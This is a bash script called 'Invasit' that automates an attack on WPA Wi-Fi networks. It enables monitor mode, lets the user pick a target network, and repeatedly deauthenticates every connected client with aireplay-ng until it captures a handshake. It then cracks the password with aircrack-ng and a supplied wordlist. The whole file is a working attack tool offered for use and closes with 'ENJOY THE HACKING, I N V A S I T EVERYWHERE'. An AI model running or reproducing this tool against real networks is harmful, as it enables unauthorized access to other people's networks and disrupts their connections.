#!/bin/bash

# Invasit version 1 || by: valvesss

###################### PRE-CHECKS ############################
## From Fluxion

if [[ $EUID -ne 0 ]]; then
        echo -e "\e[You don't have admin privilegies, execute the script as root.""\e[0m"""
        exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[The script should be exected inside a X (graphical) session.""\e[0m"""
    exit 1
fi
################## SHORTCUTS/STUFFS ##########################

# Air family
deauthtime=15
function airodumpall {
	xterm -title "FIND YOUR TARGET" -e airodump-ng --encrypt WPA $nic -w target -o kismet
}

function airodumpgetclients {
	xterm -title "SCANNING $networkname CLIENTS " $TOPLEFT -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name -o csv $nic &
}

function airodumptarget {
	xterm -title "ATTACKING $networkname NETWORK" $TOPRIGHTBIG -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name -o cap $nic &
}

function deauthesp {
	xterm -title "Deauth" $BOTTOMRIGHT -e aireplay-ng -0 $deauthtime -a $bssidtarget -c $bssidclient --ignore-negative-one $nic
}

function killeverybody {
# Kill air & xterm processes useless
	killall aireplay-ng &>/dev/null
	killall airodump-ng &>/dev/null
	killall xterm &>/dev/null			
}
# Time for most functions
st='0.2'

# Colors for echo
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
WHITE='\033[1;37m'
NC='\033[0m'

# user @ machine # shortchut
userpath="echo -n -e `whoami`@`hostname`:`pwd`#\t\b"

# Precautions
trap ctrl_c INT
function ctrl_c(){
	END
}

##################### SYSTEM REQUIREMENTS ####################
## From Fluxion
function systemrequirements {
	clear
	echo -e "	Checking system requirements...\n"
        echo -ne "	aircrack-ng....."
        if ! hash aircrack-ng 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	aireplay-ng....."
        if ! hash aireplay-ng 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	airmon-ng......."
        if ! hash airmon-ng 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	airodump-ng....."
        if ! hash airodump-ng 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	awk............."
        if ! hash awk 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        echo -ne "	xterm..........."
        if ! hash xterm 2>/dev/null; then
                echo -e "Not installed"
                exit=1
        else
                echo -e "OK!"
        fi
        sleep $st

        if [ "$exit" = "1" ]; then
        exit 1
        fi
	echo -e "\nSystem ready!"
	sleep $st
	setresolution
}

################# WINDOWS + RESOLUTIONS #####################
## From Fluxion

# Windows + Resolution
function setresolution {

        function resA {

                TOPLEFT="-geometry 90x13+0+0"
                TOPRIGHT="-geometry 83x26-0+0"
                BOTTOMLEFT="-geometry 90x24+0-0"
                BOTTOMRIGHT="-geometry 75x12-0-0"
                TOPLEFTBIG="-geometry 91x42+0+0"
                TOPRIGHTBIG="-geometry 83x26-0+0"
        }

        function resB {

                TOPLEFT="-geometry 92x14+0+0"
                TOPRIGHT="-geometry 68x25-0+0"
                BOTTOMLEFT="-geometry 92x36+0-0"
                BOTTOMRIGHT="-geometry 74x20-0-0"
                TOPLEFTBIG="-geometry 100x52+0+0"
                TOPRIGHTBIG="-geometry 74x30-0+0"
        }
        function resC {

                TOPLEFT="-geometry 100x20+0+0"
                TOPRIGHT="-geometry 109x20-0+0"
                BOTTOMLEFT="-geometry 100x30+0-0"
                BOTTOMRIGHT="-geometry 109x20-0-0"
                TOPLEFTBIG="-geometry  100x52+0+0"
                TOPRIGHTBIG="-geometry 109x30-0+0"
        }
        function resD {
                TOPLEFT="-geometry 110x35+0+0"
                TOPRIGHT="-geometry 99x40-0+0"
                BOTTOMLEFT="-geometry 110x35+0-0"
                BOTTOMRIGHT="-geometry 99x30-0-0"
                TOPLEFTBIG="-geometry 110x72+0+0"
                TOPRIGHTBIG="-geometry 99x40-0+0"
        }
        function resE {
                TOPLEFT="-geometry 130x43+0+0"
                TOPRIGHT="-geometry 68x25-0+0"
                BOTTOMLEFT="-geometry 130x40+0-0"
                BOTTOMRIGHT="-geometry 132x35-0-0"
                TOPLEFTBIG="-geometry 130x85+0+0"
                TOPRIGHTBIG="-geometry 132x48-0+0"
        }
        function resF {
                TOPLEFT="-geometry 100x17+0+0"
                TOPRIGHT="-geometry 90x27-0+0"
                BOTTOMLEFT="-geometry 100x30+0-0"
                BOTTOMRIGHT="-geometry 90x20-0-0"
                TOPLEFTBIG="-geometry  100x70+0+0"
                TOPRIGHTBIG="-geometry 90x27-0+0"
	}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
        "1024x600" ) resA ;;
        "1024x768" ) resB ;;
        "1280x768" ) resC ;;
        "1366x768" ) resC ;;
        "1280x1024" ) resD ;;
        "1600x1200" ) resE ;;
        "1366x768"  ) resF ;;
                  * ) resA ;;
esac
INTRO
}


######################### START ##############################

# INTRODUCTION
function INTRO {
clear
echo ""
echo -e "	${YELLOW}I  NN       N  V             V  A         SSSSSSSS  I  TTTTTTTTT"
sleep $st
echo -e "	I  N N      N   V           V  A A        S         I      T"
sleep $st
echo -e "	I  N  N     N    V         V  A   A       S         I      T"
sleep $st
echo -e "	I  N   N    N     V       V  A     A      SSSSSSSS  I      T"
sleep $st
echo -e "	I  N    N   N      V     V  AAAAAAAAA            S  I      T"
sleep $st
echo -e "	I  N     N  N       V   V  A         A           S  I      T"
sleep $st
echo -e "	I  N      N N        V V  A           A          S  I      T"
sleep $st
echo -e "	I  N       NN         V  A             A  SSSSSSSS  I      T${NC}"
sleep $st
echo ""
echo -e "	${BLUE}v1${NC} / ${GREEN}by: valvesss${NC} / ${RED}support: sleepyhollow.lockwood@protonmail.ch${NC}"
MONMODE
}

# 1) Create NIC mon0
function MONMODE {
# Kill all process the could couse trouble to aircrack family
airmon-ng check kill &> /dev/null &
nic=mon0
nicreal=$(iwconfig 2> /dev/null | awk 'NR==1{print $1}')
if `iw dev | grep -q $nic`; then
	ifconfig mon0 up 2> /dev/null
	GERTAB
else
	iw dev $nicreal interface add $nic type monitor 2> /dev/null
	ifconfig mon0 up 2> /dev/null
	GERTAB
fi
}

# 2) Generate table with all WPA networks found
function GERTAB {
echo -e "\n# 1) When you find the target network, press CTRL+C.  #"
airodumpall
name=target
EDTCHN
}

# 3) Edit airodump output in a human readable way and choose network
function EDTCHN {
if [ ! -f $name-01.kismet.csv ]; then
	echo -e "\n# File not found, rescaning... #"
	rm -rf $name*.kismet.csv
	airodumpall
fi
echo -e "\n# 2) Select the network you want to attack [1,2,3...N]: #\n"
# Output edit
cat target-01.kismet.csv | cut -d ';' -f1,4,6,22 | sed 's/;/ /g' | sed 's/BestQuality/-dB/g'| column -t > auxfile1
cat target-01.kismet.csv | cut -d ';' -f3 > auxfile2
# Choose network
paste -d " " auxfile1 /dev/null auxfile2 > auxfile3
echo "-------------------------------------------------------------------"
cat auxfile3
echo "^------------------------------------------------------------------"
read num
let num=num+1
# Based on users option, get the host: mac, channel and name.
bssidtarget=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $2}')
channel=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $3}')
networkname=$(cat auxfile3 | awk -v aux=$num 'NR==aux' | tr -s ' ' | cut -d ' ' -f5-8 | tr -d "[:blank:]")
rm -rf auxfile*
rm -rf $name-01.kismet.csv
name=$networkname"_"$bssidtarget
# Start airodump at the target 
ESPSCN
}

# 4) Scan especific network to get clients
function ESPSCN {
airodumpgetclients
echo "Getting mac clients..."
airodumpgetclientsPID=$!
sleep 5
mac=$name.lst
nr=0
while [ $nr = 0 ]; do
cat $name-01.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac	
nr=$(cat $mac | wc -l)
done
SCAHAN
}

# 5) Scan network to capture the HANDSHAKE
function SCAHAN {
# Start scanning network target
rm -rf $name-01.csv
airodumptarget
kill $airodumpgetclientsPID &> /dev/null
echo -e "\n# 4) Scanning $networkname to get the HANDSHAKE. #"
ATTAIR
}

# 6) Attack using aireplay-ng
function ATTAIR {
# Attack clients host until find handshake packet
i=1
	while [ $i -le $nr ]; do
		bssidclient=$(awk -v var=$i 'NR==var' $mac)
		deauthesp
		sleep 1
		let i=i+1
	done
		# If handshake corrupted or with no password
		if `aircrack-ng $name-01.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
			echo -e "\n# Handshake packet not found in .cap file, trying again... #"
			sleep 2
			ATTAIR
		fi
# Finish useless process
killeverybody
# Delete MAC clients table if all right
rm -rf $mac
WORDLIST
}

# 7) Search wordlist and verify if don't exist
function WORDLIST {
echo -e "\n# 5) Type the wordlist full path: #" 
$userpath
read path
a=0
while [ $a -eq 0  ]
do
	if [ !  -f $path ]; then
		echo -e "\n# Wordlist not found, try again: #"
		$userpath
		read path
	else
		a=1
	fi
done
AIRCRACK
}

# 8) Decryptograph the password
function AIRCRACK {
# Clean handshake packet
wpaclean $name-clean.cap $name-01.cap &> /dev/null
rm -rf $name-01.cap
# Start the wordlist method attack
aircrack-ng $name-clean.cap -w $path 2>/dev/null
echo "To finish, press ENTER..."
read enter
END
}

# 9) Reinicialize network services and delete the nic created
function END {
echo "[+] Deleting network card if created..."
if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
	iw dev $nic del
fi
sleep $st
echo "[+] Restarting network services..."
service NetworkManager restart
service networking restart
sleep $st
echo "[+] Thanks for using!"
sleep $st
echo -e "\n############################################################"
echo -e "##	${RED}ENJOY THE HACKING, I N V A S I T EVERYWHERE${NC}	  ##"
echo "############################################################"
exit
}
systemrequirements
